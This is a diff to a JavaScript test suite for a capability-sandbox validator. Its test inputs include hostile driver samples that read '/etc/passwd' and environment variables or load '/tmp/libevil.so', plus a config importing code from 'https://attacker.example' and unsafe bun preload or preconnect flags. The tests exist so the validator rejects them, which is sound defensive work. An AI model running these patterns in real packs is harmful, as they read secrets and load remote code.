@@ -16,7 +16,7 @@ import {
   world_host_capability_driver_abi_version,
   world_host_capability_pack_format_version,
 } from '../src/core/capability_pack.mjs';
-import { assertCapabilityResolutionBoundary, assertNoWorldEvidenceKeys, defineCapabilityDriver } from '../src/core/capability_driver.mjs';
+import { DryRunReport, assertCapabilityResolutionBoundary, assertNoWorldEvidenceKeys, capabilityHostClaimBytes, defineCapabilityDriver } from '../src/core/capability_driver.mjs';
 import { assertCapabilityPolicyAllows, createCapabilityPolicy, redactCapabilityDiagnostics } from '../src/core/capability_policy.mjs';
 import { networkPolicyHostRequest, runCapabilityMode } from '../src/core/capability_modes.mjs';
 import { preflightCapabilities } from '../src/core/capabilities.mjs';
@@ -550,6 +550,13 @@ describe('Capability Plane v0.2 core contracts', () => {
       ['bun-ffi', "export function CapabilityDriver() { return Bun.FFI.dlopen('/tmp/libevil.so', {}); }\n"],
       ['bun-udp', "export function CapabilityDriver() { return Bun.udpSocket({ port: 1234 }); }\n"],
       ['bun-mmap', "export function CapabilityDriver() { return Bun.mmap('/etc/passwd'); }\n"],
+      ['bun-build', "export function CapabilityDriver() { return Bun.build({ entrypoints: ['/etc/passwd'], write: false }); }\n"],
+      ['bun-glob', "export function CapabilityDriver() { return new Bun.Glob('*').scan('/etc'); }\n"],
+      ['bun-resolve', "export function CapabilityDriver() { return Bun.resolveSync('./secret', '/etc'); }\n"],
+      ['bun-sql', "export function CapabilityDriver() { return Bun.sql`select 1`; }\n"],
+      ['bun-redis', "export function CapabilityDriver() { return Bun.redis.get('key'); }\n"],
+      ['bun-s3', "export function CapabilityDriver() { return Bun.s3.file('bucket/key'); }\n"],
+      ['process-report', "export function CapabilityDriver() { return process.report.getReport().environmentVariables; }\n"],
     ]) {
       const adapter = fromUtf8(source);
       const checksum = `sha256:${await sha256Hex(adapter)}`;
@@ -1590,7 +1597,7 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [{ path: 'bin/adapter', checksum: extensionlessShebangPreloadSidecarChecksum }],
       }, { 'bin/adapter': extensionlessShebangPreloadSidecar }),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const shebangPreloadExternalImport = fromUtf8("import 'node:fs';\n");
     const shebangPreloadExternalImportChecksum = `sha256:${await sha256Hex(shebangPreloadExternalImport)}`;
@@ -1604,24 +1611,27 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './preload.mjs', checksum: shebangPreloadExternalImportChecksum },
         ],
       }, { 'bin/adapter': extensionlessShebangPreloadSidecar, './preload.mjs': shebangPreloadExternalImport }),
-      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const extensionlessShebangTypeScriptPreloadSidecar = fromUtf8("#!/usr/bin/env -S bun --preload ./preload\nconsole.log('ready');\n");
     const extensionlessShebangTypeScriptPreloadSidecarChecksum = `sha256:${await sha256Hex(extensionlessShebangTypeScriptPreloadSidecar)}`;
     const extensionlessShebangTypeScriptPreload = fromUtf8("type Preload = { ready: boolean };\nglobalThis.__preload = { ready: true } satisfies Preload;\n");
     const extensionlessShebangTypeScriptPreloadChecksum = `sha256:${await sha256Hex(extensionlessShebangTypeScriptPreload)}`;
-    assert.equal(await assertCapabilityPackChecksums({
-      ...manifest,
-      adapter: { kind: 'sidecar', command: ['bin/adapter'] },
-      docs: [],
-      checksums: [
-        { path: 'bin/adapter', checksum: extensionlessShebangTypeScriptPreloadSidecarChecksum },
-        { path: './preload', checksum: extensionlessShebangTypeScriptPreloadChecksum },
-      ],
-    }, {
-      'bin/adapter': extensionlessShebangTypeScriptPreloadSidecar,
-      './preload': extensionlessShebangTypeScriptPreload,
-    }), true);
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
+        docs: [],
+        checksums: [
+          { path: 'bin/adapter', checksum: extensionlessShebangTypeScriptPreloadSidecarChecksum },
+          { path: './preload', checksum: extensionlessShebangTypeScriptPreloadChecksum },
+        ],
+      }, {
+        'bin/adapter': extensionlessShebangTypeScriptPreloadSidecar,
+        './preload': extensionlessShebangTypeScriptPreload,
+      }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
     const denoShebangConfigSidecar = fromUtf8("#!/usr/bin/env -S deno run --config deno.json\nimport './helper.ts';\n");
     const denoShebangConfigSidecarChecksum = `sha256:${await sha256Hex(denoShebangConfigSidecar)}`;
     const denoShebangConfigWithImports = fromUtf8(JSON.stringify({ imports: { './helper.ts': 'https://attacker.example/helper.ts' } }));
@@ -1779,7 +1789,7 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
       }, { 'sidecar.mjs': sidecar }),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     await assert.rejects(
       () => assertCapabilityPackChecksums({
@@ -1832,7 +1842,7 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
         ],
       }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload }),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const bunConfigPreloadImport = fromUtf8("import 'node:fs';\n");
     const bunConfigPreloadImportChecksum = `sha256:${await sha256Hex(bunConfigPreloadImport)}`;
@@ -1847,7 +1857,7 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './unchecked.ts', checksum: bunConfigPreloadImportChecksum },
         ],
       }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload, './unchecked.ts': bunConfigPreloadImport }),
-      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     await assert.rejects(
       () => assertCapabilityPackChecksums({
@@ -1906,7 +1916,7 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './bunfig.toml', checksum: bunConfigWithQuotedPreloadKeyChecksum },
         ],
       }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithQuotedPreloadKey }),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const bunConfigWithEscapedPreloadKey = fromUtf8('"pre\\u006coad" = ["./unchecked.ts"]\n');
     const bunConfigWithEscapedPreloadKeyChecksum = `sha256:${await sha256Hex(bunConfigWithEscapedPreloadKey)}`;
@@ -1920,7 +1930,7 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './bunfig.toml', checksum: bunConfigWithEscapedPreloadKeyChecksum },
         ],
       }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithEscapedPreloadKey }),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const bunConfigWithCommentedArrayClose = fromUtf8('preload = [\n  # ]\n  "./unchecked.ts"\n]\n');
     const bunConfigWithCommentedArrayCloseChecksum = `sha256:${await sha256Hex(bunConfigWithCommentedArrayClose)}`;
@@ -1934,7 +1944,7 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './bunfig.toml', checksum: bunConfigWithCommentedArrayCloseChecksum },
         ],
       }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithCommentedArrayClose }),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const bunConfigWithMultilineStringBeforePreload = fromUtf8('banner = """\n[not-a-table]\n"""\npreload = ["./unchecked.ts"]\n');
     const bunConfigWithMultilineStringBeforePreloadChecksum = `sha256:${await sha256Hex(bunConfigWithMultilineStringBeforePreload)}`;
@@ -1948,7 +1958,7 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './bunfig.toml', checksum: bunConfigWithMultilineStringBeforePreloadChecksum },
         ],
       }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithMultilineStringBeforePreload }),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const bunConfigWithStringPreload = fromUtf8('preload = "./unchecked.ts"\n');
     const bunConfigWithStringPreloadChecksum = `sha256:${await sha256Hex(bunConfigWithStringPreload)}`;
@@ -1962,7 +1972,7 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './bunfig.toml', checksum: bunConfigWithStringPreloadChecksum },
         ],
       }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithStringPreload }),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     await assert.rejects(
       () => assertCapabilityPackChecksums({
@@ -1975,7 +1985,7 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './unchecked.ts', checksum: bunConfigPreloadImportChecksum },
         ],
       }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithStringPreload, './unchecked.ts': bunConfigPreloadImport }),
-      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const bunConfigWithPackagePreload = fromUtf8('preload = ["unchecked-package"]\n');
     const bunConfigWithPackagePreloadChecksum = `sha256:${await sha256Hex(bunConfigWithPackagePreload)}`;
@@ -1993,15 +2003,18 @@ describe('Capability Plane v0.2 core contracts', () => {
     );
     const bunConfigWithTestOnlyPreload = fromUtf8('[test]\npreload = ["unchecked-package"]\n');
     const bunConfigWithTestOnlyPreloadChecksum = `sha256:${await sha256Hex(bunConfigWithTestOnlyPreload)}`;
-    assert.equal(await assertCapabilityPackChecksums({
-      ...manifest,
-      adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
-      docs: [],
-      checksums: [
-        { path: 'sidecar.mjs', checksum: sidecarChecksum },
-        { path: './bunfig.toml', checksum: bunConfigWithTestOnlyPreloadChecksum },
-      ],
-    }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithTestOnlyPreload }), true);
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithTestOnlyPreloadChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithTestOnlyPreload }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
@@ -2226,6 +2239,18 @@ describe('Capability Plane v0.2 core contracts', () => {
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--env-file=.env.local', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: '.env.local', checksum: sidecarEnvFileChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, '.env.local': sidecarEnvFile }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
         adapter: { kind: 'sidecar', command: ['bun', '--cwd', 'workdir', 'sidecar.mjs'] },
         docs: [],
         checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
@@ -2328,7 +2353,7 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
       }, { 'sidecar.mjs': sidecar }),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const sidecarOptionImport = fromUtf8("import 'node:fs';\nconsole.log('ready');\n");
     const sidecarOptionImportChecksum = `sha256:${await sha256Hex(sidecarOptionImport)}`;
@@ -2342,8 +2367,34 @@ describe('Capability Plane v0.2 core contracts', () => {
           { path: './helper.mjs', checksum: sidecarOptionImportChecksum },
         ],
       }, { 'sidecar.mjs': sidecar, './helper.mjs': sidecarOptionImport }),
-      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--preload', './helper.mjs', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './helper.mjs', checksum: sidecarOptionImportChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './helper.mjs': sidecarOptionImport }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    for (const command of [
+      ['bun', '--fetch-preconnect=https://denied.example', 'sidecar.mjs'],
+      ['bun', '--fetch-preconnect', 'https://denied.example', 'sidecar.mjs'],
+    ]) {
+      await assert.rejects(
+        () => assertCapabilityPackChecksums({
+          ...manifest,
+          adapter: { kind: 'sidecar', command },
+          docs: [],
+          checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+        }, { 'sidecar.mjs': sidecar }),
+        { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+      );
+    }
     assert.equal(await assertCapabilityPackChecksums({
       ...manifest,
       adapter: { kind: 'sidecar', command: ['node', '-r./helper.mjs', 'sidecar.mjs'] },
@@ -3387,6 +3438,32 @@ describe('Capability Plane v0.2 core contracts', () => {
       new TextDecoder().decode(configuredHttpPolicyRequest.policyRequestBytes),
       stableJson({ prompt: 'ok' }),
     );
+    const configuredModelPromptRequest = genericHttpModelRequest(
+      `goal=${'model-prompt'.repeat(16)}`,
+      'configured-model-policy-key',
+    );
+    const configuredModelPolicyRequest = networkPolicyHostRequest(
+      configuredModelPromptRequest,
+      new GenericHttpJsonModelDriver({ endpointUrl: 'https://allowed.example/decide' }).manifest(),
+    );
+    assert.equal(
+      new TextDecoder().decode(configuredModelPolicyRequest.policyRequestBytes),
+      new TextDecoder().decode(configuredModelPromptRequest.requestBytes),
+    );
+    const headPolicyRequest = networkPolicyHostRequest({
+      ...httpRequest(),
+      requestBytes: fromUtf8(stableJson({
+        url: 'https://allowed.example/decide',
+        method: 'HEAD',
+        body: { prompt: 'bodyless prompt is not sent' },
+      })),
+    }, new GenericHttpJsonCapabilityDriver({
+      endpointUrl: 'https://allowed.example/decide',
+      allowEndpointFromRequest: true,
+      origins: ['https://allowed.example'],
+      methods: ['HEAD'],
+    }).manifest());
+    assert.equal(headPolicyRequest.policyRequestBytes.byteLength, 0);
     const requestlessHttpReport = preflightCapabilities({
       application: { requiredHostAuthorityLabels: ['network:http'] },
       drivers: [new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' })],
@@ -3725,6 +3802,26 @@ describe('Capability Plane v0.2 core contracts', () => {
       }),
       { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
     );
+    const forgedDryRunReport = Object.create(DryRunReport.prototype);
+    Object.defineProperties(forgedDryRunReport, {
+      wouldInvoke: { value: false, enumerable: true },
+      turnClosureBytes: { value: fromUtf8('closure'), enumerable: false },
+    });
+    const forgedDryRunDriver = defineCapabilityDriver(worldEvidenceReportDriver({
+      dryRunReport: forgedDryRunReport,
+    }));
+    const normalizedDryRunReport = await forgedDryRunDriver.dryRun({}, request);
+    assert.notEqual(normalizedDryRunReport, forgedDryRunReport);
+    assert.equal(normalizedDryRunReport.turnClosureBytes, undefined);
+    assert.equal(Object.getPrototypeOf(normalizedDryRunReport), DryRunReport.prototype);
+    assert.throws(
+      () => capabilityHostClaimBytes({ runHead: { generation: 1 } }),
+      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
+    );
+    assert.throws(
+      () => capabilityHostClaimBytes(new Map([['turnClosureBytes', fromUtf8('closure')]])),
+      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
+    );
     await assert.rejects(
       () => runCapabilityMode({
         mode: 'shadow',
@@ -3938,6 +4035,17 @@ describe('Capability Plane v0.2 core contracts', () => {
         { code: 'ERR_HTTP_IDEMPOTENCY_KEY_REQUIRED' },
       );
       assert.equal(observedHeaders, null);
+      const packMissingIdempotencyPreflight = packDriver.preflight({
+        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
+      }, { ...httpRequest(), idempotencyKeyWorldFingerprint: undefined });
+      assert.equal(packMissingIdempotencyPreflight.accepted, false);
+      assert.ok(packMissingIdempotencyPreflight.blockers.includes('ERR_HTTP_IDEMPOTENCY_KEY_REQUIRED'));
+      assert.throws(
+        () => packDriver.dryRun({
+          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
+        }, { ...httpRequest(), idempotencyKeyWorldFingerprint: undefined }),
+        { code: 'ERR_HTTP_IDEMPOTENCY_KEY_REQUIRED' },
+      );
 
       let packPromptLimitedFetchCalled = false;
       globalThis.fetch = async () => {
@@ -5345,6 +5453,19 @@ describe('Capability Plane v0.2 core contracts', () => {
         { code: 'ERR_HTTP_IDEMPOTENCY_KEY_REQUIRED' },
       );
       assert.equal(directFetchCalled, false);
+      const missingIdempotencyPreflight = new GenericHttpJsonCapabilityDriver({
+        endpointUrl: 'https://allowed.example/decide',
+      }).preflight({
+        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
+      }, { ...httpRequest(), idempotencyKeyWorldFingerprint: undefined });
+      assert.equal(missingIdempotencyPreflight.accepted, false);
+      assert.ok(missingIdempotencyPreflight.blockers.includes('ERR_HTTP_IDEMPOTENCY_KEY_REQUIRED'));
+      assert.throws(
+        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).dryRun({
+          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
+        }, { ...httpRequest(), idempotencyKeyWorldFingerprint: undefined }),
+        { code: 'ERR_HTTP_IDEMPOTENCY_KEY_REQUIRED' },
+      );
       await assert.rejects(
         () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({}, httpRequest()),
         { code: 'ERR_CAPABILITY_LIVE_DENIED' },
@@ -5515,6 +5636,18 @@ describe('Capability Plane v0.2 core contracts', () => {
     assert.ok(unsupportedPackApprovalReport.blockers.includes('ERR_HUMAN_APPROVAL_MODE_UNSUPPORTED'));
     await assert.rejects(
       () => unsupportedPackApproval.resolve({
+        policy: { allowLiveEffects: true, allowHumanEffects: true },
+      }, approvalRequest()),
+      { code: 'ERR_HUMAN_APPROVAL_MODE_UNSUPPORTED' },
+    );
+    assert.throws(
+      () => new HumanApprovalCapabilityDriver({ mode: 'interactive', prompt: async () => true }).dryRun({
+        policy: { allowLiveEffects: true, allowHumanEffects: true },
+      }, approvalRequest()),
+      { code: 'ERR_HUMAN_APPROVAL_MODE_UNSUPPORTED' },
+    );
+    assert.throws(
+      () => unsupportedPackApproval.dryRun({
         policy: { allowLiveEffects: true, allowHumanEffects: true },
       }, approvalRequest()),
       { code: 'ERR_HUMAN_APPROVAL_MODE_UNSUPPORTED' },
@@ -5896,6 +6029,55 @@ describe('Capability Plane v0.2 core contracts', () => {
     });
     assert.equal(approvalPolicy.proposed.proposedAction.maximumRequestBytes, 4096);
 
+    const mutatingApprovalDriver = policyMutatingApprovalDriver();
+    await assert.rejects(
+      () => runCapabilityMode({
+        mode: 'approval',
+        driver: mutatingApprovalDriver,
+        hostRequest: httpRequest(),
+        approval: () => ({ approved: true }),
+        journalOptions: {
+          store: new MemoryStore(),
+          runId: 'approval-mutated-policy-run',
+          branchId: 'main',
+          parentTurnClosureFingerprint: 'world:turn-closure:parent',
+        },
+        policy: {
+          allowLiveEffects: true,
+          allowNetworkEffects: true,
+        },
+      }),
+      { code: 'ERR_CAPABILITY_ORIGIN_ALLOWLIST_REQUIRED' },
+    );
+    assert.equal(mutatingApprovalDriver.resolveCalled, false);
+
+    const approvalMutatedPolicyDriver = policyMutatingApprovalDriver();
+    const approvalMutatedPolicy = {
+      allowLiveEffects: true,
+      allowNetworkEffects: true,
+    };
+    await assert.rejects(
+      () => runCapabilityMode({
+        mode: 'approval',
+        driver: approvalMutatedPolicyDriver,
+        hostRequest: httpRequest(),
+        approval: () => {
+          approvalMutatedPolicy.allowedOrigins = ['https://allowed.example'];
+          approvalMutatedPolicy.allowedMethods = ['POST'];
+          return { approved: true };
+        },
+        journalOptions: {
+          store: new MemoryStore(),
+          runId: 'approval-callback-mutated-policy-run',
+          branchId: 'main',
+          parentTurnClosureFingerprint: 'world:turn-closure:parent',
+        },
+        policy: approvalMutatedPolicy,
+      }),
+      { code: 'ERR_CAPABILITY_ORIGIN_ALLOWLIST_REQUIRED' },
+    );
+    assert.equal(approvalMutatedPolicyDriver.resolveCalled, false);
+
     const localShadowDeniedPackDriver = localPolicyProbeDriver({ packFingerprint });
     await assert.rejects(
       () => runCapabilityMode({
@@ -6037,6 +6219,23 @@ describe('Capability Plane v0.2 core contracts', () => {
         { code: 'ERR_CAPABILITY_PROMPT_TOO_LARGE' },
       );
       assert.equal(driver.manifest().maximumRequestBytes, 64 * 1024);
+      const renderedModelLimitRequest = genericHttpModelRequest('goal=rendered-model-limit', 'model-rendered-limit-key');
+      const renderedModelLimit = renderedModelLimitRequest.requestBytes.byteLength + 8;
+      assert.throws(
+        () => new GenericHttpJsonModelDriver({
+          endpointUrl: 'https://allowed.example/decide',
+          maximumRequestBytes: renderedModelLimit,
+          requestTemplate: { prompt: 'x'.repeat(renderedModelLimit + 64) },
+        }).dryRun({
+          policy: {
+            maximumRequestBytes: 4096,
+            maximumPromptBytes: 4096,
+            allowedOrigins: ['https://allowed.example'],
+            allowedMethods: ['POST'],
+          },
+        }, renderedModelLimitRequest),
+        { code: 'ERR_HTTP_REQUEST_TOO_LARGE' },
+      );
       const routedModelDriver = new GenericHttpJsonModelDriver({
         endpointUrl: 'https://allowed.example/decide',
         allowEndpointFromRequest: true,
@@ -6088,6 +6287,26 @@ describe('Capability Plane v0.2 core contracts', () => {
           { resolutionInputBytes: fromUtf8('recorded') },
         ).schemaAccepted,
         false,
+      );
+      assert.throws(
+        () => driver.shadow(
+          {},
+          { ...genericHttpModelRequest('goal=model-shadow', 'model-shadow-key'), requestBytes: fromUtf8('not-json') },
+          { resolutionInputBytes: fromUtf8('recorded') },
+        ),
+        { code: 'ERR_AGENT_DECISION_PROMPT_MALFORMED' },
+      );
+      assert.throws(
+        () => new GenericHttpJsonModelDriver({
+          endpointUrl: 'https://allowed.example/decide',
+          maximumRequestBytes: renderedModelLimit,
+          requestTemplate: { prompt: 'x'.repeat(renderedModelLimit + 64) },
+        }).shadow(
+          {},
+          renderedModelLimitRequest,
+          { resolutionInputBytes: fromUtf8('recorded') },
+        ),
+        { code: 'ERR_HTTP_REQUEST_TOO_LARGE' },
       );
       assert.throws(() => new GenericHttpJsonModelDriver({
         endpointUrl: 'https://allowed.example/decide?api_key=secret',
@@ -6463,10 +6682,14 @@ describe('Capability Plane v0.2 core contracts', () => {
       type: HostEventType.runFailed,
       at: 'caller-clock',
       worldAuthoredEvidence: true,
+      runHead: { generation: 1 },
+      nested: { turnClosureBytes: fromUtf8('closure'), safe: true },
     });
     assert.equal(event.type, HostEventType.capabilityPackLoaded);
     assert.equal(event.at === 'caller-clock', false);
     assert.equal(event.worldAuthoredEvidence, false);
+    assert.equal(event.runHead, undefined);
+    assert.deepEqual(event.nested, { safe: true });
     const bigintEvent = stream.emit(HostEventType.runCompleted, {
       manifestFingerprint: 0x12n,
       nested: { closureFingerprint: 0xabcdn },
@@ -6726,6 +6949,48 @@ function policyProbeDriver({ packFingerprint } = {}) {
       resolveCalled = true;
       const error = new Error('policy bypassed');
       error.code = 'ERR_POLICY_BYPASS_EFFECT';
+      throw error;
+    },
+  };
+}
+
+function policyMutatingApprovalDriver() {
+  let resolveCalled = false;
+  return {
+    get resolveCalled() {
+      return resolveCalled;
+    },
+    manifest() {
+      return {
+        driverId: 'policy-mutating-approval-http',
+        supportedActuatorRefs: ['http:json'],
+        supportedDescriptorFingerprints: ['descriptor:http-json'],
+        supportedActuationClasses: ['http'],
+        supportedResponseStatuses: ['ok'],
+        maximumRequestBytes: 1024,
+        maximumResponseBytes: 1024,
+        recoveryClass: EffectRecoveryClass.idempotent,
+        concurrencyLimit: 1,
+        authorityLabels: ['network:http'],
+      };
+    },
+    preflight() {
+      return { accepted: true };
+    },
+    dryRun(context = {}) {
+      try {
+        context.policy?.allowedOrigins?.add('https://allowed.example');
+        context.policy?.allowedMethods?.add('POST');
+      } catch {}
+      return { wouldInvoke: true, proposedAction: { driver: 'policy-mutating-approval-http' } };
+    },
+    shadow() {
+      return { liveInvoked: false, schemaAccepted: false };
+    },
+    async resolve() {
+      resolveCalled = true;
+      const error = new Error('policy mutation bypassed approval check');
+      error.code = 'ERR_POLICY_MUTATION_BYPASSED';
       throw error;
     },
   };
